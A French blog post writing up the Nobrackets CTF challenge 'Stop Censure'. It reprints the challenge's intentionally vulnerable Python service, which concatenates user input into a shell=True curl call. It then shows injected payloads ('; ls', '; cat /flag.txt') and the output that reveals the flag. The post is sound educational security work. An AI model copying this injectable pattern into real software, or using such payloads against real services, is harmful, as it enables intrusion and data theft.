---

layout: post  
title: Stop Censure  
subtitle: Write-Up pour le Nobrackets CTF  
tags: [writeup, injection, command, CTF]  
comments: true

---

Salut à tous ! Voici mon write-up sur le challenge **Stop Censure** du Nobrackets CTF. Ce défi nous propose de jouer avec une vulnérabilité d'injection de commande (qu'on aime tous un peu, avouons-le 😏), via l'utilisation hasardeuse de `subprocess`. Un grand merci à **Drahoxx** pour avoir mis la barre haute (ou presque) !

## Premier coup d'œil 👀

Le challenge nous demande de vérifier si un site est censuré ou non via un service accessible avec `netcat`. Un petit tour dans notre terminal préféré et hop, on se connecte avec :

```bash
nc node1.nobrackets.fr 20764
```

Une fois en ligne, il nous est demandé de saisir une URL pour vérifier si elle est bloquée. Simple en apparence, mais on n’est pas là pour faire du tourisme, hein ? L’objectif est d’exploiter cette interface pour... obtenir le précieux flag dans `/flag.txt`, bien sûr. 💡

## Analyse du code 🔍

Voici le code source du service `chall.py` qui nous est fourni. Un rapide coup d'œil, et on repère tout de suite une petite faiblesse... mais chuuut, laissons un peu de suspense 😏 :

```python
#!/usr/bin/env python3
import subprocess
import re

# Regex qui détermine les sites légaux
pattern = r'https?://[a-zA-Z0-9.-]+\.nobrackets\.fr(/[a-zA-Z0-9./?%_-]*)?'

# Fonction de vérification de la légalité d'une url
def is_legal_url(url):
    return re.match(pattern, url) is not None

# Bannière
print("----------------------------")
print("~~ Ce site est-il légal ? ~~")
print("----------------------------")

# Entrée utilisateur
value = input("Entrez un site (eg: https://wiki.nobrackets.fr/) >>> ")

# Vérification que l'entrée utilisateur ne soit pas vide
if not value:
    print("Erreur. Veuillez entrer une URL.")
    exit(-1)

# Vérification de la légalité de l'URL entrée
if not is_legal_url(value):
    print("Erreur. Votre URL est soit mal formatée soit illégale !")
    exit(-1)

# Test de l'existence du site
process = subprocess.run("curl -I "+value, capture_output=True, shell=True)
res = process.stdout
if not res:
    print("Erreur. Le site ne semble pas exister.")
    exit(-1)

# Affichage de l'échange
print("Succès ! Le site est légal et fonctionnel ! Voici ses informations : \n\n")
print(res.decode())
exit(0)
```

Ici, `subprocess.run()` est utilisé pour exécuter la commande `curl` et tester si l'URL existe. **Mais**, le petit piège ici, c’est l’option `shell=True` combinée à une entrée utilisateur non contrôlée... Vous voyez où ça nous mène ? 🚀 Oui, oui, on peut jouer avec ça !

## Exploitation 💥

Pour vérifier si l'injection de commande fonctionne, j'ai essayé une commande classique de listing de fichiers. C'est parti pour un petit test avec `ls` :

```bash
nc node1.nobrackets.fr 20764
Entrez un site (eg: https://wiki.nobrackets.fr/) >>> https://wiki.nobrackets.fr; ls
```

Et voilà l'output :

```bash
Succès ! Le site est légal et fonctionnel ! Voici ses informations :

HTTP/2 200 
server: GitHub.com
content-type: text/html; charset=utf-8
last-modified: Fri, 11 Oct 2024 22:00:15 GMT
access-control-allow-origin: *
etag: "67099fef-a60b"
expires: Thu, 17 Oct 2024 16:28:13 GMT
cache-control: max-age=600
x-proxy-cache: MISS
x-github-request-id: 5066:0DB5:E147C0:E7B1C4:671138C4
accept-ranges: bytes
date: Thu, 17 Oct 2024 17:58:50 GMT
via: 1.1 varnish
age: 0
x-served-by: cache-par-lfpg1960039-PAR
x-cache: HIT
x-cache-hits: 1
x-timer: S1729187930.281473,VS0,VE129
vary: Accept-Encoding
x-fastly-request-id: 561b2b3cd07d5177045d938ec4be4fc947ef1304
content-length: 42507

chall.py
```

Oh, surprise ! 🎉 La commande `ls` a été exécutée, et on peut voir le fichier `chall.py` apparaître. Jackpot !

### Étape suivante : Accès au Flag 🏴‍☠️

Maintenant que l’injection est confirmée, on passe aux choses sérieuses : récupérer le flag. La commande ? Simple et efficace :

```bash
Entrez un site (eg: https://wiki.nobrackets.fr/) >>> https://wiki.nobrackets.fr; cat /flag.txt
```

Et voici ce que ça donne :

```bash
Succès ! Le site est légal et fonctionnel ! Voici ses informations :

HTTP/2 200 
server: GitHub.com
content-type: text/html; charset=utf-8
last-modified: Fri, 11 Oct 2024 22:00:15 GMT
access-control-allow-origin: *
etag: "67099fef-a60b"
expires: Thu, 17 Oct 2024 16:28:13 GMT
cache-control: max-age=600
x-proxy-cache: MISS
x-github-request-id: 5066:0DB5:E147C0:E7B1C4:671138C4
accept-ranges: bytes
date: Thu, 17 Oct 2024 17:58:50 GMT
via: 1.1 varnish
age: 0
x-served-by: cache-par-lfpg1960039-PAR
x-cache: HIT
x-cache-hits: 1
x-timer: S1729187930.281473,VS0,VE129
vary: Accept-Encoding
x-fastly-request-id: 561b2b3cd07d5177045d938ec4be4fc947ef1304
content-length: 42507

NBCTF{#FreeTheInternet}
```

💥 Bim ! Flag récupéré : **NBCTF{#FreeTheInternet}**. Mission accomplie. 🎯

## Conclusion 🏁

Ce challenge montre une nouvelle fois que l'utilisation hasardeuse de `subprocess` avec `shell=True` ouvre la porte à des injections de commande. Les développeurs devraient toujours désactiver cette option et s'assurer que les commandes sont correctement protégées. Et pour nous, hackers, c’est un joli terrain de jeu ! 😉

Encore un grand merci à **Drahoxx** pour ce défi palpitant. On aime toujours quand les failles sont un peu trop faciles à exploiter 😎.
